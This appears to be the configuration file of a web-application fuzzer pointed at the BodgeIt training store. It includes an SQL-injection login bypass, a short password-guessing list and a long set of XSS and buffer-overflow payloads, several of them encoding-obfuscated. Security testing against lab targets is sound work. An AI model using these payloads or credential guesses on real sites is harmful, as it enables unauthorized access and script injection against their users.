# Flags
attempt_login = True			# Attempt login (Requires login_data)
page_discovery = True			# Crawl and discover pages
page_guessing = False			# Guess pages based on internal list (Requires guess_pages)
pass_guessing = True			# Guess passwords based on internal list (Requires guess_passwords)
fuzz_complete = True			# False implies random fuzzing

# Wait time between requests in seconds
wait_time = 0

# Data for a login
login_data = {
	"url": "/bodgeit/login.jsp",
	"proto": "http",
	"rtype": "post",
	"data": {
		"username": "' OR '1'='1",
		"password": "' OR '1'='1"
	},
	"success_text": "You have logged in successfully"
}

# Relative URLs for guessing
guess_pages = [
	"/bodgeit/admin/index.php"
]

# Password dictionary for guessing
guess_passwords = {
	"admin": "pass",
	"administrator": "password",
	"test": "text",
	"foo": "' OR '1'='1"
}

# Sensitive data to look out for
sensitive_data = [
	"mypassword",
	"my secret string",
	"amazon_aws_secret"
]

# Tests to execute on pages
fuzz_tests = {
	"Sanitization": {
		"vector": ["'derp"],
		"fail_results": ["'derp"],
		"fail_message": "%s input unsanitized on %s in param %s" 
	},
	"XSS Injection": {
		"vector": [
			'>"><script>alert("XSS")</script>&',
			'"><STYLE>@import"javascript:alert(\'XSS\')";</STYLE>',
			'>"\'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;',
			'alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>',
			'>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>',
			"'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'",
			'">',
			'>"',
			"'';!--\"<XSS>=&{()}",
			"<IMG SRC=\"javascript:alert('XSS');\">",
			"<IMG SRC=javascript:alert('XSS')>",
			"<IMG SRC=JaVaScRiPt:alert('XSS')>",
			"<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>",
			"<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;",
			"&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>",
			"<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058",
			"&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>",		   
			"<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28",
			"&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>",
			'<IMG SRC="jav&#x09;ascript:alert(<WBR>\'XSS\');">',
			'<IMG SRC="jav&#x0A;ascript:alert(<WBR>\'XSS\');">',
			'<IMG SRC="jav&#x0D;ascript:alert(<WBR>\'XSS\');">'
		]
	},
	"Buffer Overflows": {
		"vector": [
			"A"*5,
			"A"*17,
			"A"*33,
			"A"*65,
			"A"*129,
			"A"*257,
			"A"*513,
			"A"*1024,
			"A"*2049,
			"A"*4097,
			"A"*8193,
			"A"*12288
		]
	}
}
